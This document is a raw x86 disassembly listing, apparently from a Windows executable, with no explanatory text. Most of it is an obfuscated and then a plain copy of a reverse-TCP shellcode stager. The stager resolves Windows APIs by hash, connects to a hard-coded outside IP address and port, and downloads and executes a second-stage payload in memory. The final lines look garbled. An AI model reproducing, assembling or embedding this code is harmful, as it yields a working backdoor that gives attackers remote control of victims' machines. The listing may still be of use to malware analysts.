  4060b1:	eb 09                	jmp    0x4060bc
  4060b3:	c9                   	leave
  4060b4:	81 37 4e 49 3f 92    	xorl   $0x923f494e,(%edi)
  4060ba:	5b                   	pop    %ebx
  4060bb:	f5                   	cmc
  4060bc:	8b 52 10             	mov    0x10(%edx),%edx
  4060bf:	eb 0d                	jmp    0x4060ce
  4060c1:	42                   	inc    %edx
  4060c2:	38 d9                	cmp    %bl,%cl
  4060c4:	3b d4                	cmp    %esp,%edx
  4060c6:	3c 1b                	cmp    $0x1b,%al
  4060c8:	f4                   	hlt
  4060c9:	36 5c                	ss pop %esp
  4060cb:	d3 62 85             	shll   %cl,-0x7b(%edx)
  4060ce:	8b 42 3c             	mov    0x3c(%edx),%eax
  4060d1:	eb 0c                	jmp    0x4060df
  4060d3:	bb 5f bb c4 2a       	mov    $0x2ac4bb5f,%ebx
  4060d8:	a8 f5                	test   $0xf5,%al
  4060da:	d6                   	salc
  4060db:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4060dc:	f4                   	hlt
  4060dd:	8b 0d 01 d0 90 eb    	mov    0xeb90d001,%ecx
  4060e3:	08 03                	or     %al,(%ebx)
  4060e5:	a0 11 14 6b 80       	mov    0x806b1411,%al
  4060ea:	a9 24 8b 40 78       	test   $0x78408b24,%eax
  4060ef:	90                   	nop
  4060f0:	eb 0c                	jmp    0x4060fe
  4060f2:	aa                   	stos   %al,%es:(%edi)
  4060f3:	fe                   	(bad)
  4060f4:	11 ba 9f 81 3a 70    	adc    %edi,0x703a819f(%edx)
  4060fa:	8e 6a 00             	mov    0x0(%edx),%gs
  4060fd:	7c 85                	jl     0x406084
  4060ff:	c0 0f 84             	rorb   $0x84,(%edi)
  406102:	71 01                	jno    0x406105
  406104:	00 00                	add    %al,(%eax)
  406106:	90                   	nop
  406107:	eb 0e                	jmp    0x406117
  406109:	e0 70                	loopne 0x40617b
  40610b:	95                   	xchg   %eax,%ebp
  40610c:	d2 95 64 18 97 d7    	rclb   %cl,-0x2868e79c(%ebp)
  406112:	b2 c3                	mov    $0xc3,%dl
  406114:	f7 08 0e 90 01 d0    	testl  $0xd001900e,(%eax)
  40611a:	90                   	nop
  40611b:	8b 48 18             	mov    0x18(%eax),%ecx
  40611e:	50                   	push   %eax
  40611f:	8b 58 20             	mov    0x20(%eax),%ebx
  406122:	90                   	nop
  406123:	eb 09                	jmp    0x40612e
  406125:	33 52 9d             	xor    -0x63(%edx),%edx
  406128:	17                   	pop    %ss
  406129:	29 c2                	sub    %eax,%edx
  40612b:	74 69                	je     0x406196
  40612d:	2c 01                	sub    $0x1,%al
  40612f:	d3 eb                	shr    %cl,%ebx
  406131:	09 95 10 40 51 e4    	or     %edx,-0x1baebff0(%ebp)
  406137:	01 48 a0             	add    %ecx,-0x60(%eax)
  40613a:	ba 90 eb 0f 63       	mov    $0x630feb90,%edx
  40613f:	ec                   	in     (%dx),%al
  406140:	53                   	push   %ebx
  406141:	8c 12                	mov    %ss,(%edx)
  406143:	1a 66 66             	sbb    0x66(%esi),%ah
  406146:	73 5b                	jae    0x4061a3
  406148:	21 ee                	and    %ebp,%esi
  40614a:	ef                   	out    %eax,(%dx)
  40614b:	c6 c2 85             	mov    $0x85,%dl
  40614e:	c9                   	leave
  40614f:	90                   	nop
  406150:	eb 0d                	jmp    0x40615f
  406152:	e1 c3                	loope  0x406117
  406154:	78 6a                	js     0x4061c0
  406156:	1f                   	pop    %ds
  406157:	43                   	inc    %ebx
  406158:	dc 60 63             	fsubl  0x63(%eax)
  40615b:	08 01                	or     %al,(%ecx)
  40615d:	4e                   	dec    %esi
  40615e:	b4 0f                	mov    $0xf,%ah
  406160:	84 03                	test   %al,(%ebx)
  406162:	01 00                	add    %eax,(%eax)
  406164:	00 31                	add    %dh,(%ecx)
  406166:	ff 49 90             	decl   -0x70(%ecx)
  406169:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  40616c:	90                   	nop
  40616d:	01 d6                	add    %edx,%esi
  40616f:	31 c0                	xor    %eax,%eax
  406171:	eb 0e                	jmp    0x406181
  406173:	88 c3                	mov    %al,%bl
  406175:	55                   	push   %ebp
  406176:	07                   	pop    %es
  406177:	5b                   	pop    %ebx
  406178:	7a 1b                	jp     0x406195
  40617a:	5c                   	pop    %esp
  40617b:	f6 fc                	idiv   %ah
  40617d:	ef                   	out    %eax,(%dx)
  40617e:	f4                   	hlt
  40617f:	7d 3b                	jge    0x4061bc
  406181:	c1 cf 0d             	ror    $0xd,%edi
  406184:	90                   	nop
  406185:	ac                   	lods   %ds:(%esi),%al
  406186:	01 c7                	add    %eax,%edi
  406188:	90                   	nop
  406189:	38 e0                	cmp    %ah,%al
  40618b:	90                   	nop
  40618c:	75 e1                	jne    0x40616f
  40618e:	90                   	nop
  40618f:	eb 09                	jmp    0x40619a
  406191:	b7 12                	mov    $0x12,%bh
  406193:	b3 72                	mov    $0x72,%bl
  406195:	a0 ef 98 d8 d6       	mov    0xd6d898ef,%al
  40619a:	eb 09                	jmp    0x4061a5
  40619c:	c0 59 fd e4          	rcrb   $0xe4,-0x3(%ecx)
  4061a0:	84 32                	test   %dh,(%edx)
  4061a2:	6c                   	insb   (%dx),%es:(%edi)
  4061a3:	9f                   	lahf
  4061a4:	b6 03                	mov    $0x3,%dh
  4061a6:	7d f8                	jge    0x4061a0
  4061a8:	3b 7d 24             	cmp    0x24(%ebp),%edi
  4061ab:	90                   	nop
  4061ac:	eb 0c                	jmp    0x4061ba
  4061ae:	ee                   	out    %al,(%dx)
  4061af:	17                   	pop    %ss
  4061b0:	61                   	popa
  4061b1:	bb 3b 22 3f 5a       	mov    $0x5a3f223b,%ebx
  4061b6:	7a 62                	jp     0x40621a
  4061b8:	9c                   	pushf
  4061b9:	1d 0f 85 7b ff       	sbb    $0xff7b850f,%eax
  4061be:	ff                   	(bad)
  4061bf:	ff 90 eb 08 bb f7    	call   *-0x844f715(%eax)
  4061c5:	e7 e1                	out    %eax,$0xe1
  4061c7:	10 82 5c 5b 58 8b    	adc    %al,-0x74a7a4a4(%edx)
  4061cd:	58                   	pop    %eax
  4061ce:	24 01                	and    $0x1,%al
  4061d0:	d3 eb                	shr    %cl,%ebx
  4061d2:	0b 5c 5c 54          	or     0x54(%esp,%ebx,2),%ebx
  4061d6:	34 d6                	xor    $0xd6,%al
  4061d8:	9b                   	fwait
  4061d9:	3d 24 ed 92 b3       	cmp    $0xb392ed24,%eax
  4061de:	66 8b 0c 4b          	mov    (%ebx,%ecx,2),%cx
  4061e2:	90                   	nop
  4061e3:	eb 0a                	jmp    0x4061ef
  4061e5:	ff c8                	dec    %eax
  4061e7:	0d cf f0 64 f7       	or     $0xf764f0cf,%eax
  4061ec:	c0 02 30             	rolb   $0x30,(%edx)
  4061ef:	8b 58 1c             	mov    0x1c(%eax),%ebx
  4061f2:	01 d3                	add    %edx,%ebx
  4061f4:	e9 0f 00 00 00       	jmp    0x406208
  4061f9:	4e                   	dec    %esi
  4061fa:	19 dc                	sbb    %ebx,%esp
  4061fc:	73 fe                	jae    0x4061fc
  4061fe:	15 8b ce 6e d0       	adc    $0xd06ece8b,%eax
  406203:	b8 d6 bb 55 66       	mov    $0x6655bbd6,%eax
  406208:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  40620b:	90                   	nop
  40620c:	e9 09 00 00 00       	jmp    0x40621a
  406211:	23 9e b5 00 94 0e    	and    0xe9400b5(%esi),%ebx
  406217:	ec                   	in     (%dx),%al
  406218:	e3 a9                	jecxz  0x4061c3
  40621a:	01 d0                	add    %edx,%eax
  40621c:	90                   	nop
  40621d:	e9 0c 00 00 00       	jmp    0x40622e
  406222:	75 6e                	jne    0x406292
  406224:	dc 26                	fsubl  (%esi)
  406226:	64 2e 3d cf da f2 23 	fs cs cmp $0x23f2dacf,%eax
  40622d:	67 89 44 24          	mov    %eax,0x24(%si)
  406231:	24 5b                	and    $0x5b,%al
  406233:	90                   	nop
  406234:	e9 08 00 00 00       	jmp    0x406241
  406239:	17                   	pop    %ss
  40623a:	3d fc 32 b9 6f       	cmp    $0x6fb932fc,%eax
  40623f:	8c b9 5b e9 09 00    	mov    %?,0x9e95b(%ecx)
  406245:	00 00                	add    %al,(%eax)
  406247:	88 5f c3             	mov    %bl,-0x3d(%edi)
  40624a:	e7 77                	out    %eax,$0x77
  40624c:	1f                   	pop    %ds
  40624d:	37                   	aaa
  40624e:	6c                   	insb   (%dx),%es:(%edi)
  40624f:	df 61 59             	fbld   0x59(%ecx)
  406252:	90                   	nop
  406253:	5a                   	pop    %edx
  406254:	90                   	nop
  406255:	51                   	push   %ecx
  406256:	90                   	nop
  406257:	e9 09 00 00 00       	jmp    0x406265
  40625c:	65 36 54             	gs ss push %esp
  40625f:	35 d7 25 98 08       	xor    $0x89825d7,%eax
  406264:	a9 ff e0 90 90       	test   $0x9090e0ff,%eax
  406269:	e9 08 00 00 00       	jmp    0x406276
  40626e:	30 fc                	xor    %bh,%ah
  406270:	9a 69 fa f6 9f 71 58 	lcall  $0x5871,$0x9ff6fa69
  406277:	e9 09 00 00 00       	jmp    0x406285
  40627c:	3e cc                	ds int3
  40627e:	93                   	xchg   %eax,%ebx
  40627f:	d5 60                	aad    $0x60
  406281:	4b                   	dec    %ebx
  406282:	7c 5d                	jl     0x4062e1
  406284:	e4 5f                	in     $0x5f,%al
  406286:	90                   	nop
  406287:	5a                   	pop    %edx
  406288:	e9 0f 00 00 00       	jmp    0x40629c
  40628d:	ee                   	out    %al,(%dx)
  40628e:	f0 1c 75             	lock sbb $0x75,%al
  406291:	f7 0b ef 73 2c 73    	testl  $0x732c73ef,(%ebx)
  406297:	72 0c                	jb     0x4062a5
  406299:	72 a1                	jb     0x40623c
  40629b:	30 8b 12 90 e9 0f    	xor    %cl,0xfe99012(%ebx)
  4062a1:	00 00                	add    %al,(%eax)
  4062a3:	00 0c 6b             	add    %cl,(%ebx,%ebp,2)
  4062a6:	2a e7                	sub    %bh,%ah
  4062a8:	ab                   	stos   %eax,%es:(%edi)
  4062a9:	01 7d 09             	add    %edi,0x9(%ebp)
  4062ac:	c3                   	ret
  4062ad:	a3 9f bd df 14       	mov    %eax,0x14dfbd9f
  4062b2:	65 e9 45 fd ff ff    	gs jmp 0x405ffd
  4062b8:	e9 0c 00 00 00       	jmp    0x4062c9
  4062bd:	8b e4                	mov    %esp,%esp
  4062bf:	5e                   	pop    %esi
  4062c0:	6b e6 d3             	imul   $0xffffffd3,%esi,%esp
  4062c3:	13 f3                	adc    %ebx,%esi
  4062c5:	aa                   	stos   %al,%es:(%edi)
  4062c6:	f5                   	cmc
  4062c7:	38 1f                	cmp    %bl,(%edi)
  4062c9:	90                   	nop
  4062ca:	5d                   	pop    %ebp
  4062cb:	e9 0f 00 00 00       	jmp    0x4062df
  4062d0:	c4                   	(bad)
  4062d1:	f6 f3                	div    %bl
  4062d3:	36 f6 50 86          	notb   %ss:-0x7a(%eax)
  4062d7:	ee                   	out    %al,(%dx)
  4062d8:	11 d6                	adc    %edx,%esi
  4062da:	03 07                	add    (%edi),%eax
  4062dc:	30 f0                	xor    %dh,%al
  4062de:	27                   	daa
  4062df:	be 62 01 00 00       	mov    $0x162,%esi
  4062e4:	6a 40                	push   $0x40
  4062e6:	68 00 10 00 00       	push   $0x1000
  4062eb:	e9 0d 00 00 00       	jmp    0x4062fd
  4062f0:	53                   	push   %ebx
  4062f1:	d6                   	salc
  4062f2:	b0 e3                	mov    $0xe3,%al
  4062f4:	3d ba d6 52 87       	cmp    $0x8752d6ba,%eax
  4062f9:	33 e7                	xor    %edi,%esp
  4062fb:	ae                   	scas   %es:(%edi),%al
  4062fc:	d6                   	salc
  4062fd:	56                   	push   %esi
  4062fe:	6a 00                	push   $0x0
  406300:	e9 0f 00 00 00       	jmp    0x406314
  406305:	4c                   	dec    %esp
  406306:	54                   	push   %esp
  406307:	8c 54 94 ad          	mov    %ss,-0x53(%esp,%edx,4)
  40630b:	0e                   	push   %cs
  40630c:	19 88 ab df ee e3    	sbb    %ecx,-0x1c112055(%eax)
  406312:	13 e7                	adc    %edi,%esp
  406314:	68 58 a4 53 e5       	push   $0xe553a458
  406319:	90                   	nop
  40631a:	e9 0c 00 00 00       	jmp    0x40632b
  40631f:	34 35                	xor    $0x35,%al
  406321:	67 81 de 2c 1e 4d f9 	addr16 sbb $0xf94d1e2c,%esi
  406328:	a2 a6 73 ff d5       	mov    %al,0xd5ff73a6
  40632d:	89 c3                	mov    %eax,%ebx
  40632f:	e9 0e 00 00 00       	jmp    0x406342
  406334:	72 b3                	jb     0x4062e9
  406336:	7c d6                	jl     0x40630e
  406338:	91                   	xchg   %eax,%ecx
  406339:	63 e1                	arpl   %esp,%ecx
  40633b:	50                   	push   %eax
  40633c:	cd 33                	int    $0x33
  40633e:	25 71 4d 19 89       	and    $0x89194d71,%eax
  406343:	c7                   	(bad)
  406344:	90                   	nop
  406345:	e9 0f 00 00 00       	jmp    0x406359
  40634a:	e5 47                	in     $0x47,%eax
  40634c:	54                   	push   %esp
  40634d:	85 9d 3d 20 d3 dc    	test   %ebx,-0x232cdfc3(%ebp)
  406353:	17                   	pop    %ss
  406354:	f5                   	cmc
  406355:	f4                   	hlt
  406356:	d1 c3                	rol    $1,%ebx
  406358:	47                   	inc    %edi
  406359:	89 f1                	mov    %esi,%ecx
  40635b:	90                   	nop
  40635c:	e8 32 01 00 00       	call   0x406493
  406361:	90                   	nop
  406362:	e9 0e 00 00 00       	jmp    0x406375
  406367:	e5 e2                	in     $0xe2,%eax
  406369:	6f                   	outsl  %ds:(%esi),(%dx)
  40636a:	b0 fb                	mov    $0xfb,%al
  40636c:	de e3                	fsubp  %st,%st(3)
  40636e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40636f:	66 73 cc             	data16 jae 0x40633e
  406372:	23 83 8d 5e 90 f2    	and    -0xd6fa173(%ebx),%eax
  406378:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406379:	e9 0f 00 00 00       	jmp    0x40638d
  40637e:	b9 60 6f 18 e8       	mov    $0xe8186f60,%ecx
  406383:	93                   	xchg   %eax,%ebx
  406384:	ce                   	into
  406385:	c9                   	leave
  406386:	c0 34 39 d2          	shlb   $0xd2,(%ecx,%edi,1)
  40638a:	d1 5d 8b             	rcrl   $1,-0x75(%ebp)
  40638d:	e8 df 00 00 00       	call   0x406471
  406392:	e9 0f 00 00 00       	jmp    0x4063a6
  406397:	7c e7                	jl     0x406380
  406399:	91                   	xchg   %eax,%ecx
  40639a:	30 73 65             	xor    %dh,0x65(%ebx)
  40639d:	ca 99 04             	lret   $0x499
  4063a0:	ca a4 fc             	lret   $0xfca4
  4063a3:	a1 1f ec 90 e9       	mov    0xe990ec1f,%eax
  4063a8:	0e                   	push   %cs
  4063a9:	00 00                	add    %al,(%eax)
  4063ab:	00 c1                	add    %al,%cl
  4063ad:	ad                   	lods   %ds:(%esi),%eax
  4063ae:	98                   	cwtl
  4063af:	6a 3d                	push   $0x3d
  4063b1:	89 0a                	mov    %ecx,(%edx)
  4063b3:	35 79 3b 01 f3       	xor    $0xf3013b79,%eax
  4063b8:	ca e2 bb             	lret   $0xbbe2
  4063bb:	e0 1d                	loopne 0x4063da
  4063bd:	2a 0a                	sub    (%edx),%cl
  4063bf:	68 a6 95 bd 9d       	push   $0x9dbd95a6
  4063c4:	90                   	nop
  4063c5:	e9 09 00 00 00       	jmp    0x4063d3
  4063ca:	de f5                	fdivp  %st,%st(5)
  4063cc:	31 60 41             	xor    %esp,0x41(%eax)
  4063cf:	cb                   	lret
  4063d0:	11 7b c2             	adc    %edi,-0x3e(%ebx)
  4063d3:	89 e8                	mov    %ebp,%eax
  4063d5:	e9 0d 00 00 00       	jmp    0x4063e7
  4063da:	20 0d 95 9b 94 e8    	and    %cl,0xe8949b95
  4063e0:	1b 6c 2c 98          	sbb    -0x68(%esp,%ebp,1),%ebp
  4063e4:	0b 73 1d             	or     0x1d(%ebx),%esi
  4063e7:	ff d0                	call   *%eax
  4063e9:	90                   	nop
  4063ea:	3c 06                	cmp    $0x6,%al
  4063ec:	90                   	nop
  4063ed:	e9 0c 00 00 00       	jmp    0x4063fe
  4063f2:	5c                   	pop    %esp
  4063f3:	ab                   	stos   %eax,%es:(%edi)
  4063f4:	9a a8 fb 03 79 f5 4f 	lcall  $0x4ff5,$0x7903fba8
  4063fb:	ae                   	scas   %es:(%edi),%al
  4063fc:	8c 60 0f             	mov    %fs,0xf(%eax)
  4063ff:	8c 31                	mov    %?,(%ecx)
  406401:	00 00                	add    %al,(%eax)
  406403:	00 90 80 fb e0 0f    	add    %dl,0xfe0fb80(%eax)
  406409:	85 27                	test   %esp,(%edi)
  40640b:	00 00                	add    %al,(%eax)
  40640d:	00 e9                	add    %ch,%cl
  40640f:	0f 00 00             	sldt   (%eax)
  406412:	00 48 4c             	add    %cl,0x4c(%eax)
  406415:	60                   	pusha
  406416:	1b a5 3b 69 80 ba    	sbb    -0x457f96c5(%ebp),%esp
  40641c:	2f                   	das
  40641d:	4b                   	dec    %ebx
  40641e:	8e f1                	mov    %ecx,%?
  406420:	11 51 bb             	adc    %edx,-0x45(%ecx)
  406423:	47                   	inc    %edi
  406424:	13 72 6f             	adc    0x6f(%edx),%esi
  406427:	e9 09 00 00 00       	jmp    0x406435
  40642c:	80 ce 0a             	or     $0xa,%dh
  40642f:	e6 b2                	out    %al,$0xb2
  406431:	99                   	cltd
  406432:	52                   	push   %edx
  406433:	cb                   	lret
  406434:	1d e9 09 00 00       	sbb    $0x9e9,%eax
  406439:	00 eb                	add    %ch,%bl
  40643b:	81 cf f0 36 17 3c    	or     $0x3c1736f0,%edi
  406441:	26 ca 6a 00          	es lret $0x6a
  406445:	e9 0f 00 00 00       	jmp    0x406459
  40644a:	f7 c5 04 bf 1b 20    	test   $0x201bbf04,%ebp
  406450:	8c 40 00             	mov    %es,0x0(%eax)
  406453:	33 54 64 eb          	xor    -0x15(%esp,%eiz,2),%edx
  406457:	0f ab 53 e9          	bts    %edx,-0x17(%ebx)
  40645b:	0f 00 00             	sldt   (%eax)
  40645e:	00 a8 ee 6b 41 97    	add    %ch,-0x68be9412(%eax)
  406464:	54                   	push   %esp
  406465:	eb c1                	jmp    0x406428
  406467:	59                   	pop    %ecx
  406468:	cd c6                	int    $0xc6
  40646a:	1d 2c 86 76 ff       	sbb    $0xff76862c,%eax
  40646f:	d5 90                	aad    $0x90
  406471:	31 c0                	xor    %eax,%eax
  406473:	90                   	nop
  406474:	64 ff 30             	push   %fs:(%eax)
  406477:	90                   	nop
  406478:	64 89 20             	mov    %esp,%fs:(%eax)
  40647b:	ff d3                	call   *%ebx
  40647d:	90                   	nop
  40647e:	e9 0b 00 00 00       	jmp    0x40648e
  406483:	fa                   	cli
  406484:	75 7c                	jne    0x406502
  406486:	4e                   	dec    %esi
  406487:	b9 45 58 7d 09       	mov    $0x97d5845,%ecx
  40648c:	04 22                	add    $0x22,%al
  40648e:	e9 ff fe ff ff       	jmp    0x406392
  406493:	e8 c9 fe ff ff       	call   0x406361
  406498:	fc                   	cld
  406499:	e8 8f 00 00 00       	call   0x40652d
  40649e:	60                   	pusha
  40649f:	89 e5                	mov    %esp,%ebp
  4064a1:	31 d2                	xor    %edx,%edx
  4064a3:	64 8b 52 30          	mov    %fs:0x30(%edx),%edx
  4064a7:	8b 52 0c             	mov    0xc(%edx),%edx
  4064aa:	8b 52 14             	mov    0x14(%edx),%edx
  4064ad:	0f b7 4a 26          	movzwl 0x26(%edx),%ecx
  4064b1:	31 ff                	xor    %edi,%edi
  4064b3:	8b 72 28             	mov    0x28(%edx),%esi
  4064b6:	31 c0                	xor    %eax,%eax
  4064b8:	ac                   	lods   %ds:(%esi),%al
  4064b9:	3c 61                	cmp    $0x61,%al
  4064bb:	7c 02                	jl     0x4064bf
  4064bd:	2c 20                	sub    $0x20,%al
  4064bf:	c1 cf 0d             	ror    $0xd,%edi
  4064c2:	01 c7                	add    %eax,%edi
  4064c4:	49                   	dec    %ecx
  4064c5:	75 ef                	jne    0x4064b6
  4064c7:	52                   	push   %edx
  4064c8:	57                   	push   %edi
  4064c9:	8b 52 10             	mov    0x10(%edx),%edx
  4064cc:	8b 42 3c             	mov    0x3c(%edx),%eax
  4064cf:	01 d0                	add    %edx,%eax
  4064d1:	8b 40 78             	mov    0x78(%eax),%eax
  4064d4:	85 c0                	test   %eax,%eax
  4064d6:	74 4c                	je     0x406524
  4064d8:	01 d0                	add    %edx,%eax
  4064da:	8b 48 18             	mov    0x18(%eax),%ecx
  4064dd:	50                   	push   %eax
  4064de:	8b 58 20             	mov    0x20(%eax),%ebx
  4064e1:	01 d3                	add    %edx,%ebx
  4064e3:	85 c9                	test   %ecx,%ecx
  4064e5:	74 3c                	je     0x406523
  4064e7:	31 ff                	xor    %edi,%edi
  4064e9:	49                   	dec    %ecx
  4064ea:	8b 34 8b             	mov    (%ebx,%ecx,4),%esi
  4064ed:	01 d6                	add    %edx,%esi
  4064ef:	31 c0                	xor    %eax,%eax
  4064f1:	c1 cf 0d             	ror    $0xd,%edi
  4064f4:	ac                   	lods   %ds:(%esi),%al
  4064f5:	01 c7                	add    %eax,%edi
  4064f7:	38 e0                	cmp    %ah,%al
  4064f9:	75 f4                	jne    0x4064ef
  4064fb:	03 7d f8             	add    -0x8(%ebp),%edi
  4064fe:	3b 7d 24             	cmp    0x24(%ebp),%edi
  406501:	75 e0                	jne    0x4064e3
  406503:	58                   	pop    %eax
  406504:	8b 58 24             	mov    0x24(%eax),%ebx
  406507:	01 d3                	add    %edx,%ebx
  406509:	66 8b 0c 4b          	mov    (%ebx,%ecx,2),%cx
  40650d:	8b 58 1c             	mov    0x1c(%eax),%ebx
  406510:	01 d3                	add    %edx,%ebx
  406512:	8b 04 8b             	mov    (%ebx,%ecx,4),%eax
  406515:	01 d0                	add    %edx,%eax
  406517:	89 44 24 24          	mov    %eax,0x24(%esp)
  40651b:	5b                   	pop    %ebx
  40651c:	5b                   	pop    %ebx
  40651d:	61                   	popa
  40651e:	59                   	pop    %ecx
  40651f:	5a                   	pop    %edx
  406520:	51                   	push   %ecx
  406521:	ff e0                	jmp    *%eax
  406523:	58                   	pop    %eax
  406524:	5f                   	pop    %edi
  406525:	5a                   	pop    %edx
  406526:	8b 12                	mov    (%edx),%edx
  406528:	e9 80 ff ff ff       	jmp    0x4064ad
  40652d:	5d                   	pop    %ebp
  40652e:	68 33 32 00 00       	push   $0x3233
  406533:	68 77 73 32 5f       	push   $0x5f327377
  406538:	54                   	push   %esp
  406539:	68 4c 77 26 07       	push   $0x726774c
  40653e:	89 e8                	mov    %ebp,%eax
  406540:	ff d0                	call   *%eax
  406542:	b8 90 01 00 00       	mov    $0x190,%eax
  406547:	29 c4                	sub    %eax,%esp
  406549:	54                   	push   %esp
  40654a:	50                   	push   %eax
  40654b:	68 29 80 6b 00       	push   $0x6b8029
  406550:	ff d5                	call   *%ebp
  406552:	6a 0a                	push   $0xa
  406554:	68 67 61 59 62       	push   $0x62596167
  406559:	68 02 00 13 c4       	push   $0xc4130002
  40655e:	89 e6                	mov    %esp,%esi
  406560:	50                   	push   %eax
  406561:	50                   	push   %eax
  406562:	50                   	push   %eax
  406563:	50                   	push   %eax
  406564:	40                   	inc    %eax
  406565:	50                   	push   %eax
  406566:	40                   	inc    %eax
  406567:	50                   	push   %eax
  406568:	68 ea 0f df e0       	push   $0xe0df0fea
  40656d:	ff d5                	call   *%ebp
  40656f:	97                   	xchg   %eax,%edi
  406570:	6a 10                	push   $0x10
  406572:	56                   	push   %esi
  406573:	57                   	push   %edi
  406574:	68 99 a5 74 61       	push   $0x6174a599
  406579:	ff d5                	call   *%ebp
  40657b:	85 c0                	test   %eax,%eax
  40657d:	74 0a                	je     0x406589
  40657f:	ff 4e 08             	decl   0x8(%esi)
  406582:	75 ec                	jne    0x406570
  406584:	e8 67 00 00 00       	call   0x4065f0
  406589:	6a 00                	push   $0x0
  40658b:	6a 04                	push   $0x4
  40658d:	56                   	push   %esi
  40658e:	57                   	push   %edi
  40658f:	68 02 d9 c8 5f       	push   $0x5fc8d902
  406594:	ff d5                	call   *%ebp
  406596:	83 f8 00             	cmp    $0x0,%eax
  406599:	7e 36                	jle    0x4065d1
  40659b:	8b 36                	mov    (%esi),%esi
  40659d:	6a 40                	push   $0x40
  40659f:	68 00 10 00 00       	push   $0x1000
  4065a4:	56                   	push   %esi
  4065a5:	6a 00                	push   $0x0
  4065a7:	68 58 a4 53 e5       	push   $0xe553a458
  4065ac:	ff d5                	call   *%ebp
  4065ae:	93                   	xchg   %eax,%ebx
  4065af:	53                   	push   %ebx
  4065b0:	6a 00                	push   $0x0
  4065b2:	56                   	push   %esi
  4065b3:	53                   	push   %ebx
  4065b4:	57                   	push   %edi
  4065b5:	68 02 d9 c8 5f       	push   $0x5fc8d902
  4065ba:	ff d5                	call   *%ebp
  4065bc:	83 f8 00             	cmp    $0x0,%eax
  4065bf:	7d 28                	jge    0x4065e9
  4065c1:	58                   	pop    %eax
  4065c2:	68 00 40 00 00       	push   $0x4000
  4065c7:	6a 00                	push   $0x0
  4065c9:	50                   	push   %eax
  4065ca:	68 0b 2f 0f 30       	push   $0x300f2f0b
  4065cf:	ff d5                	call   *%ebp
  4065d1:	57                   	push   %edi
  4065d2:	68 75 6e 4d 61       	push   $0x614d6e75
  4065d7:	ff d5                	call   *%ebp
  4065d9:	5e                   	pop    %esi
  4065da:	5e                   	pop    %esi
  4065db:	ff 0c 24             	decl   (%esp)
  4065de:	0f 85 70 ff ff ff    	jne    0x406554
  4065e4:	e9 9b ff ff ff       	jmp    0x406584
  4065e9:	01 c3                	add    %eax,%ebx
  4065eb:	29 c6                	sub    %eax,%esi
  4065ed:	75 c1                	jne    0x4065b0
  4065ef:	c3                   	ret
  4065f0:	bb f0 b5 a2 56       	mov    $0x56a2b5f0,%ebx
  4065f5:	6a 00                	push   $0x0
  4065f7:	53                   	push   %ebx
  4065f8:	ff d5                	call   *%ebp
  4065fa:	ff 75 05             	push   0x5(%ebp)
  4065fd:	bf 02 00 00 00       	mov    $0x2,%edi
  406602:	8b fd                	mov    %ebp,%edi
  406604:	18 8b 75 d3 50 b9    	sbb    %cl,-0x46af2c8b(%ebx)
  40660a:	e8 71 c3 00 00       	call   0x412980
  40660f:	8b 5d 14             	mov    0x14(%ebp),%ebx
  406612:	8b 4d 87             	mov    -0x79(%ebp),%ecx
  406615:	83 c4 08             	add    $0x8,%esp
  406618:	9f                   	lahf
  406619:	51                   	push   %ecx
  40661a:	57                   	push   %edi
  40661b:	9e                   	sahf
  40661c:	15 a7 c1 40 00       	adc    $0x40c1a7,%eax
  406621:	8b 16                	mov    (%esi),%edx
  406623:	89 42 04             	mov    %eax,0x4(%edx)
  406626:	8b 06                	mov    (%esi),%eax
  406628:	8b 51 04             	mov    0x4(%ecx),%edx
  40662b:	83 d0 30             	adc    $0x30,%eax
  40662e:	5f                   	pop    %edi
  40662f:	1e                   	push   %ds
  406630:	8b 27                	mov    (%edi),%esp
  406632:	d8 c1                	fadd   %st(1),%st
  406634:	77 00                	ja     0x406636
  406636:	3c d6                	cmp    $0xd6,%al
  406638:	46                   	inc    %esi
  406639:	4a                   	dec    %edx
  40663a:	0f 84 56 00 00 00    	je     0x406696
  406640:	ff 63 5f             	jmp    *0x5f(%ebx)
  406643:	5e                   	pop    %esi
  406644:	05 3b fc 0a 22       	add    $0x220afc3b,%eax
  406649:	5b                   	pop    %ebx
  40664a:	5d                   	pop    %ebp
  40664b:	9b                   	fwait
  40664c:	14 e9                	adc    $0xe9,%al
  40664e:	b6 3d                	mov    $0x3d,%dh
  406650:	dc 08                	fmull  (%eax)
  406652:	41                   	inc    %ecx
  406653:	00 e0                	add    %ah,%al
  406655:	7c 0d                	jl     0x406664
  406657:	6a ff                	push   $0xffffffff
  406659:	6a 01                	push   $0x1
  40665b:	50                   	push   %eax
  40665c:	ff 15 70 c0 40 00    	call   *0x40c070
  406662:	eb 9c                	jmp    0x406600
  406664:	0c 15                	or     $0x15,%al
  406666:	6c                   	insb   (%dx),%es:(%edi)
  406667:	c0 40 00 8b          	rolb   $0x8b,0x0(%eax)
  40666b:	16                   	push   %ss
  40666c:	6a 02                	push   $0x2
  40666e:	6a c9                	push   $0xffffffc9
  406670:	8d 4b 0c             	lea    0xc(%ebx),%ecx
  406673:	6a 00                	push   $0x0
  406675:	24 8b                	and    $0x8b,%al
  406677:	4a                   	dec    %edx
  406678:	04 50                	add    $0x50,%al
  40667a:	51                   	push   %ecx
  40667b:	50                   	push   %eax
  40667c:	df 50 68             	fists  0x68(%eax)
  40667f:	c0 40 00 85          	rolb   $0x85,0x0(%eax)
  406683:	c0 74 a4 8b 16       	shlb   $0x16,-0x75(%esp,%eiz,4)
  406688:	8b 42 04             	mov    0x4(%edx),%eax
  40668b:	50                   	push   %eax
  40668c:	ff 15 c0 c1 40 00    	call   *0x40c1c0
  406692:	8b 0e                	mov    (%esi),%ecx
  406694:	8b 55 2c             	mov    0x2c(%ebp),%edx
  406697:	6b 51 04 8b          	imul   $0xffffff8b,0x4(%ecx),%edx
  40669b:	45                   	inc    %ebp
  40669c:	10 8b 0e cc 50 57    	adc    %cl,0x5750cc0e(%ebx)
  4066a2:	51                   	push   %ecx
  4066a3:	e8 98 77 00 00       	call   0x40de40
  4066a8:	8b 16                	mov    (%esi),%edx
  4066aa:	33 a2 a4 83 da 10    	xor    0x10da83a4(%edx),%esp
  4066b0:	89 84 20 a5 20 57 40 	mov    %eax,0x405720a5(%eax,%eiz,1)
  4066b7:	94                   	xchg   %eax,%esp
  4066b8:	68 e0 66 40 00       	push   $0x4066e0
  4066bd:	89 42 24             	mov    %eax,0x24(%edx)
